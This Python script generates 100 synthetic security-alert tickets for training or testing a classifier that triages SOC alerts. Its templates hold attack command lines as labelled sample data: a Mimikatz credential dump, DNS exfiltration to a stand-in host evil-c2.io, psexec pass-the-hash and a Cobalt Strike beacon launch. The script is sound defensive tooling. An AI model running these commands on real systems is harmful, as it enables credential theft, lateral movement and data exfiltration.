"""
Generates a synthetic 100-ticket ndjson dataset matching the flat schema
expected by pipeline/classifier.py's extract_features_from_dict():

ticket_id, severity, status, created_time, rule_triggered, mitre_attack,
user, user_type, source_asset, source_ip, target_asset, target_ip,
process, command_line, decoded_command, hour_of_day, day_of_week,
historical_tp_count, historical_fp_count, label

Run: python scripts/generate_tickets.py
Output: data/tickets_100.ndjson
"""

import json
import random
from datetime import datetime, timedelta

random.seed(42)

DAYS = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"]

INTERNAL_SUBNETS = ["10.10.1.", "10.10.2.", "10.10.3.", "10.20.1.", "172.16.5.", "192.168.1."]
EXTERNAL_IPS = ["45.76.123.88", "195.88.54.212", "8.8.8.8", "203.0.113.10", "91.219.237.5", "103.224.182.19"]

# (rule, mitre, process, command_line, decoded_command, label, severity_pool, user_type)
TEMPLATES = [
    ("PowerShell Encoded Command Execution", "T1059.001", "powershell.exe",
     "powershell.exe -EncodedCommand JABzAD0AJwBXAGkAbgBkAG8AdwBzAFQAaQBtAGUAJwA7",
     "w32tm.exe /query /status", "FALSE_POSITIVE", ["MEDIUM", "HIGH"], "service_account"),
    ("Scheduled Task Created via Schtasks", "T1053.005", "schtasks.exe",
     'schtasks /create /tn "NightlyBackup" /tr "C:\\backup\\run.bat" /sc daily',
     'schtasks /create /tn "NightlyBackup" /tr "C:\\backup\\run.bat" /sc daily', "FALSE_POSITIVE",
     ["LOW", "MEDIUM"], "service_account"),
    ("WMI Remote Execution Detected", "T1047", "wmiprvse.exe",
     "wmic /node:{ip} process call create 'cmd /c gpupdate /force'",
     "wmic /node:{ip} process call create 'cmd /c gpupdate /force'", "FALSE_POSITIVE",
     ["MEDIUM", "HIGH"], "service_account"),
    ("Net User Account Enumeration", "T1087.001", "net.exe",
     "net user /domain", "net user /domain", "FALSE_POSITIVE", ["LOW", "MEDIUM"], "service_account"),
    ("Admin Script Execution Outside Business Hours", "T1059.001", "powershell.exe",
     "powershell.exe -ExecutionPolicy Bypass -File C:\\admin\\scripts\\routine_maint.ps1",
     "Routine maintenance script executed by scheduled job", "FALSE_POSITIVE",
     ["MEDIUM", "HIGH"], "admin_user"),
    ("Privileged Command Execution by Admin Account", "T1078", "cmd.exe",
     "cmd.exe /c robocopy /MIR /Z", "Known IT admin performing scheduled mirror job",
     "FALSE_POSITIVE", ["LOW", "MEDIUM"], "admin_user"),
    ("Mimikatz LSASS Credential Dumping", "T1003.001", "mimikatz.exe",
     "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
     "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", "TRUE_POSITIVE",
     ["CRITICAL"], "standard_user"),
    ("Ransomware File Extension Mass Rename", "T1486", "explorer.exe",
     "explorer.exe [mass rename .docx -> .locked detected via file system monitor]",
     "Mass file encryption event: files renamed to .locked", "TRUE_POSITIVE",
     ["CRITICAL"], "standard_user"),
    ("Impossible Travel Login Detected", "T1078", "lsass.exe",
     "Authentication from {ip} 42 mins after auth from internal IP",
     "Impossible travel: physical travel impossible in elapsed time", "TRUE_POSITIVE",
     ["HIGH", "CRITICAL"], "admin_user"),
    ("Large Volume Data Exfiltration via DNS", "T1048.003", "nslookup.exe",
     "nslookup c3VwZXJzZWNyZXRkYXRhYmFzZWR1bXA=.evil-c2.io 8.8.8.8",
     "Data exfiltration via DNS tunneling: several GB transferred to external C2",
     "TRUE_POSITIVE", ["CRITICAL"], "service_account"),
    ("Cobalt Strike Beacon Detected", "T1059.003", "rundll32.exe",
     "rundll32.exe cobalt_beacon.dll,StartBeacon", "Cobalt Strike beacon callback to known C2 infrastructure",
     "TRUE_POSITIVE", ["CRITICAL"], "standard_user"),
    ("Pass-the-Hash Lateral Movement", "T1003", "psexec.exe",
     "psexec.exe \\\\{ip} -u admin -p hash cmd.exe", "Pass-the-hash lateral movement detected via psexec",
     "TRUE_POSITIVE", ["CRITICAL"], "standard_user"),
    ("VPN Login from Unusual Country", "T1078", "lsass.exe",
     "VPN authentication from {ip} — user normally authenticates from US",
     "Login from unusual country. Travel not confirmed in HR system.", "NEEDS_REVIEW",
     ["MEDIUM", "HIGH"], "standard_user"),
    ("Bulk Password Reset Outside Business Hours", "T1098", "powershell.exe",
     "powershell.exe -File bulk_user_reset.ps1 -Force",
     "Bulk password reset script executed at night — no change ticket found", "NEEDS_REVIEW",
     ["HIGH"], "admin_user"),
    ("Unusual Process Spawned by Office Document", "T1059.005", "winword.exe",
     "winword.exe -> cmd.exe -> powershell.exe -nop -w hidden",
     "Office macro spawned suspicious child process chain, intent unclear", "NEEDS_REVIEW",
     ["MEDIUM", "HIGH"], "standard_user"),
]

USER_POOL = {
    "service_account": ["SVC-AnsibleDeploy", "SVC-BackupAgent", "SVC-SCCM", "SVC-Monitoring",
                         "SVC-Splunk", "SVC-Patching", "aws-svc-account@corp.com"],
    "standard_user": ["j.smith", "m.johnson", "l.davis", "t.taylor", "p.moore",
                       "k.wilson", "s.anderson", "a.williams", "bwilliams"],
    "admin_user": ["agarcia", "tadmin", "sysadmin", "admin.garcia", "Administrator"],
}

SOURCE_ASSETS = ["MGMT-SRV-01", "BACKUP-SRV-02", "SCCM-SRV-01", "MON-SRV-01", "DESK-PC-089",
                  "DESK-PC-112", "AZURE-GATEWAY", "DB-SRV-03", "VPN-GW-01", "ADMIN-WS-03"]
TARGET_ASSETS = ["APP-SRV-07", "FILE-SRV-01", "DESK-PC-144", "DC-01", "DC-02", "VPN-GW-01",
                  "EXTERNAL-DNS", "CORP-INTRANET"]


def random_internal_ip():
    return random.choice(INTERNAL_SUBNETS) + str(random.randint(2, 250))


def gen_ticket(i: int) -> dict:
    rule, mitre, process, cmd_tpl, decoded_tpl, label, sev_pool, user_type = random.choice(TEMPLATES)
    user = random.choice(USER_POOL[user_type])
    severity = random.choice(sev_pool)

    external = random.random() < 0.3
    target_ip = random.choice(EXTERNAL_IPS) if external else random_internal_ip()
    source_ip = random_internal_ip()
    command_line = cmd_tpl.format(ip=target_ip) if "{ip}" in cmd_tpl else cmd_tpl
    decoded_command = decoded_tpl.format(ip=target_ip) if "{ip}" in decoded_tpl else decoded_tpl

    created = datetime(2026, 6, 1) + timedelta(
        days=random.randint(0, 16), hours=random.randint(0, 23), minutes=random.randint(0, 59)
    )

    if label == "TRUE_POSITIVE":
        hist_tp, hist_fp = random.randint(1, 5), random.randint(0, 2)
    elif label == "FALSE_POSITIVE":
        hist_tp, hist_fp = 0, random.randint(5, 50)
    else:
        hist_tp, hist_fp = random.randint(0, 2), random.randint(0, 5)

    return {
        "ticket_id": f"INC-2026-{1000 + i}",
        "severity": severity,
        "status": "OPEN",
        "created_time": created.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "rule_triggered": rule,
        "mitre_attack": mitre,
        "user": user,
        "user_type": user_type,
        "source_asset": random.choice(SOURCE_ASSETS),
        "source_ip": source_ip,
        "target_asset": random.choice(TARGET_ASSETS),
        "target_ip": target_ip,
        "process": process,
        "command_line": command_line,
        "decoded_command": decoded_command,
        "hour_of_day": created.hour,
        "day_of_week": DAYS[created.weekday()],
        "historical_tp_count": hist_tp,
        "historical_fp_count": hist_fp,
        "label": label,
    }


def main():
    tickets = [gen_ticket(i) for i in range(100)]
    out_path = "data/tickets_100.ndjson"
    with open(out_path, "w") as f:
        for t in tickets:
            f.write(json.dumps(t) + "\n")
    print(f"Wrote {len(tickets)} tickets to {out_path}")


if __name__ == "__main__":
    main()
